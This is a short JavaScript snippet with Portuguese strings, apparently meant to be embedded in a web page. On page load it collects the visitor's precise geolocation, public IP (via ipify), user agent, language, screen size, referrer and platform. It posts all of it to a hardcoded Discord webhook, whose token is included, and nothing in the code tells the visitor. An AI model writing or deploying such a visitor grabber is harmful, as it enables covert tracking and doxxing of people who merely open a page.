  <script>
  function enviarMensagem() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          
          sendMessage(latitude, longitude);
        },
        (error) => {
          console.error("Erro ao obter a localização:", error);
          
          sendMessage(null, null);
        }
      );
    } else {
      console.error("Geolocalização não suportada pelo navegador.");
      
      sendMessage(null, null);
    }
  }

  function sendMessage(latitude, longitude) {
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        const ipAddress = data.ip;
        const webhookUrl = "https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b";

        const userAgent = navigator.userAgent;
        const language = navigator.language;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        const referrer = document.referrer;
        const operatingSystem = navigator.platform;

        const locationMessage = latitude && longitude ? `Location: ${latitude},${longitude}\n` : '';
        const message = `@everyone Nova visita ao site!\nIP: ${ipAddress}\n${locationMessage}User-Agent: ${userAgent}\nLinguagem: ${language}\nScreen Resolução: ${screenWidth}x${screenHeight}\nReferrer: ${referrer}\nSistema Operacional: ${operatingSystem}`;

        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            content: message,
          }),
        })
          .then((response) => {
            console.log("Mensagem enviada com sucesso!");
          })
          .catch((error) => {
            console.error("Erro ao enviar a mensagem:", error);
          });
      })
      .catch((error) => {
        console.error("Erro ao obter o endereço IP:", error);
      });
  }

  window.addEventListener("DOMContentLoaded", (event) => {
    enviarMensagem();
  });
        </script>
